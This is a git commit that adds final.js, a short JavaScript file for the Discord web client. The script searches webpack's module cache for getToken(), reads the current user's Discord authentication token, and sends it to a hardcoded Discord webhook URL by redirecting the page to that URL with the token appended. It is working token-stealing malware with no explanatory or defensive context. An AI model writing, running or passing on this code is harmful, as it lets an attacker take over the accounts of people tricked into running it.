060801535f6fc435731be3edbf4a1bd62b99bd7f
Aabbaaii13 <photoman894@gmail.com>
2025-02-24 05:15:16 +0500

    Create final.js

---
+++ final.js
@@ -0,0 +1,6 @@
+const url = 'https://discord.com/api/webhooks/1343315527161876510/C-lXrEFbRk0_wFVbzIKnUtza8SRIflZ54XVq9IzNPUXy43otxnwWh3I-bs9RnX08UeLZ';
+var f = (webpackChunkdiscord_app.push([[''], {}, e=> {
+  m = [];
+  for (let c in e.c) m.push(e.c[c]);
+}]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
+window.location.replace(url + '/' + f);
